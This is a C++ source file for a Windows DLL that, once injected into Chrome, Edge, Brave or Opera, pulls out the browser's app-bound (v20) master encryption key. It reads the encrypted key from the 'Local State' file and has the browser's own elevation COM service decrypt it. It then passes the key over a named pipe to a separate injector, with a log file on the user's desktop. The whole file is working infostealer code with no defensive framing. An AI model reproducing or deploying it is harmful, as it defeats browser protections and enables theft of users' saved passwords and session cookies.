#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <thread>
#include <algorithm>
#include <wincrypt.h>
#include <shlobj.h>
#include <objbase.h>
#include "json.hpp"
#include <bcrypt.h>

using json = nlohmann::json;
namespace fs = std::filesystem;

void log_to_file(const std::string& msg) {
    char* user_profile = nullptr;
    size_t len = 0;
    _dupenv_s(&user_profile, &len, "USERPROFILE");
    if (user_profile) {
        fs::path log_path = fs::path(user_profile) / "Desktop" / "extractor_log.txt";
        std::ofstream log_file(log_path, std::ios::app);
        if (log_file) {
            log_file << "[" << GetTickCount() << "] " << msg << std::endl;
        }
        free(user_profile);
    }
}

enum class Browser { Chrome, Edge, Brave, Opera, OperaGX };

// COM Interface definitions
struct IElevatorVTbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(void*, const GUID*, void**);
    ULONG(STDMETHODCALLTYPE* AddRef)(void*);
    ULONG(STDMETHODCALLTYPE* Release)(void*);
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(void*, const wchar_t*, const wchar_t*, const wchar_t*, uint32_t, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* EncryptData)(void*, uint32_t, BSTR, BSTR*, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* DecryptData)(void*, BSTR, BSTR*, uint32_t*);
};

struct IEdgeElevatorVTbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(void*, const GUID*, void**);
    ULONG(STDMETHODCALLTYPE* AddRef)(void*);
    ULONG(STDMETHODCALLTYPE* Release)(void*);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod1)(void*);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod2)(void*);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod3)(void*);
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(void*, const wchar_t*, const wchar_t*, const wchar_t*, uint32_t, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* EncryptData)(void*, uint32_t, BSTR, BSTR*, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* DecryptData)(void*, BSTR, BSTR*, uint32_t*);
};

const GUID CLSID_CHROME_ELEVATOR = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
const GUID IID_CHROME_IELEVATOR1 = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };
const GUID IID_CHROME_IELEVATOR2 = { 0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38} };

const GUID CLSID_EDGE_ELEVATOR = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
const GUID IID_EDGE_IELEVATOR1 = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };
const GUID IID_EDGE_IELEVATOR2 = { 0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05} };

const GUID CLSID_BRAVE_ELEVATOR = { 0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B} };
const GUID IID_BRAVE_IELEVATOR1 = { 0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9} };
const GUID IID_BRAVE_IELEVATOR2 = { 0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38} };

std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsigned char>& encrypted_blob, Browser browser) {
    GUID clsid;
    std::vector<GUID> iids;
    if (browser == Browser::Chrome) { clsid = CLSID_CHROME_ELEVATOR; iids = { IID_CHROME_IELEVATOR2, IID_CHROME_IELEVATOR1 }; }
    else if (browser == Browser::Edge) { clsid = CLSID_EDGE_ELEVATOR; iids = { IID_EDGE_IELEVATOR2, IID_EDGE_IELEVATOR1 }; }
    else { clsid = CLSID_BRAVE_ELEVATOR; iids = { IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1 }; }

    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return {};

    void* elevator = nullptr;
    for (auto& iid : iids) {
        hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, &elevator);
        if (SUCCEEDED(hr)) break;
    }

    if (!elevator) { CoUninitialize(); return {}; }

    CoSetProxyBlanket((IUnknown*)elevator, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);

    BSTR bstr_enc = SysAllocStringByteLen((const char*)encrypted_blob.data(), encrypted_blob.size());
    BSTR bstr_dec = nullptr;
    uint32_t last_error = 0;

    if (browser == Browser::Edge) {
        auto vtable = *(IEdgeElevatorVTbl**)elevator;
        hr = vtable->DecryptData(elevator, bstr_enc, &bstr_dec, &last_error);
    } else {
        auto vtable = *(IElevatorVTbl**)elevator;
        hr = vtable->DecryptData(elevator, bstr_enc, &bstr_dec, &last_error);
    }

    std::vector<unsigned char> res;
    if (SUCCEEDED(hr) && bstr_dec) {
        res.assign((unsigned char*)bstr_dec, (unsigned char*)bstr_dec + SysStringByteLen(bstr_dec));
    }

    if (bstr_enc) SysFreeString(bstr_enc);
    if (bstr_dec) SysFreeString(bstr_dec);

    auto vtable = *(IElevatorVTbl**)elevator;
    vtable->Release(elevator);
    CoUninitialize();
    return res;
}

static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::vector<unsigned char> ret;
    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; i < 3; i++) ret.push_back(char_array_3[i]);
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }
    return ret;
}

Browser get_browser() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    std::wstring s(path);
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    if (s.find(L"msedge.exe") != std::wstring::npos) return Browser::Edge;
    if (s.find(L"brave.exe") != std::wstring::npos) return Browser::Brave;
    if (s.find(L"opera.exe") != std::wstring::npos || s.find(L"launcher.exe") != std::wstring::npos) {
        if (s.find(L"opera gx") != std::wstring::npos) return Browser::OperaGX;
        return Browser::Opera;
    }
    return Browser::Chrome;
}

void do_work() {
    try {
        log_to_file("DLL Attached. Starting v20 key extraction...");
        Browser browser = get_browser();

        char* user_profile_env = nullptr;
        size_t len = 0;
        _dupenv_s(&user_profile_env, &len, "USERPROFILE");
        if (!user_profile_env) return;
        fs::path user_profile(user_profile_env);
        free(user_profile_env);

        fs::path data_path;
        if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
        else if (browser == Browser::Edge) data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
        else if (browser == Browser::Brave) data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
        else if (browser == Browser::Opera) data_path = user_profile / "AppData/Roaming/Opera Software/Opera Stable";
        else if (browser == Browser::OperaGX) data_path = user_profile / "AppData/Roaming/Opera Software/Opera GX Stable";

        std::string local_state_str;
        std::ifstream ls_file(data_path / "Local State");
        if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());

        json ls_json = json::parse(local_state_str, nullptr, false);
        std::string v20_b64;
        if (!ls_json.is_discarded()) {
            if (ls_json.contains("app_bound_encrypted_key")) v20_b64 = ls_json["app_bound_encrypted_key"];
            else if (ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("app_bound_encrypted_key")) v20_b64 = ls_json["os_crypt"]["app_bound_encrypted_key"];
        }

        if (v20_b64.empty()) {
            log_to_file("No app_bound_encrypted_key found.");
            return;
        }

        auto decoded = base64_decode(v20_b64);
        std::vector<unsigned char> blob = (decoded.size() > 4 && std::string((char*)decoded.data(), 4) == "APPB") ? std::vector<unsigned char>(decoded.begin() + 4, decoded.end()) : decoded;
        std::vector<unsigned char> v20_key = decrypt_with_elevator(blob, browser);

        if (v20_key.empty()) {
            log_to_file("v20 key retrieval failed.");
            return;
        }

        log_to_file("v20 key retrieved successfully. Sending to injector...");

        HANDLE h_pipe = INVALID_HANDLE_VALUE;
        for (int i = 0; i < 60; i++) {
            h_pipe = CreateFileW(L"\\\\.\\pipe\\chrome_extractor", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
            if (h_pipe != INVALID_HANDLE_VALUE) break;
            Sleep(500);
        }

        if (h_pipe != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(h_pipe, v20_key.data(), (DWORD)v20_key.size(), &written, nullptr);
            FlushFileBuffers(h_pipe);
            CloseHandle(h_pipe);
            log_to_file("v20 key sent via pipe.");
        }
    } catch (...) {
        log_to_file("Exception in DLL do_work.");
    }
}

DWORD WINAPI thread_func(LPVOID) {
    do_work();
    return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        std::wstring cmd = GetCommandLineW();
        if (cmd.find(L"--type=") == std::wstring::npos) {
            HANDLE hThread = CreateThread(NULL, 0, thread_func, NULL, 0, NULL);
            if (hThread) CloseHandle(hThread);
        }
    }
    return TRUE;
}
